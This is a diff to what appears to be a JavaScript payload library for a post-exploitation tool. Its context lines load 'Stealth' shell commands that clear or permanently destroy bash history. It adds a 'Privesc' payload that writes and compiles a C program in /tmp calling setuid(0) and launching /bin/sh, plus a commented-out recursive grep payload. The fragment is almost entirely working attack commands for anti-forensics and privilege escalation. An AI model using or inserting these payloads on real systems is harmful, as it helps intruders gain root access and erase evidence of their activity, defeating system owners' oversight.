@@ -216,6 +216,21 @@ Load({ payload: "history -c", desc: "Clear bash history", category: "Stealth"})
 Load({ payload: "touch ~/.bash_history", desc: "Clear bash history", category: "Stealth"})
 Load({ payload: "rm -rf ~/.bash_history && ln -s ~/.bash_history /dev/null", desc:"Permanently remove bash history", category:"Stealth"})
 
+// ############### Privesc  ######################
+
+// Load({
+// 	desc: "Find files and grep results",
+// 	payload: "find . -type f -exec grep -IHin '<PROMPT (search string)>' 2>/dev/null {} +",
+// 	callback: function(bro){
+// 		question("What search term would you like to use?");
+// 		ask.some(questions, bro);
+// 	},
+// 	category: "File System"
+// })
+
+// Credit to @LuxCupitor
+Load({ title: "Write r00t.c to the /tmp directory and compile", payload: "echo -e '#include <unistd.h>\\nint main(int argc, char **argv)\\n{\\nsetuid(0);\\nsetgid(0);\\nexecl(\"/bin/sh\", \"sh\", NULL);\\nreturn 1;\\n}\\n' > /tmp/r00t.c;gcc /tmp/r00t.c -o /tmp/r00t", category: "Privesc"})
+
 /*
 ######################################################
 ############### End of Payloads ######################
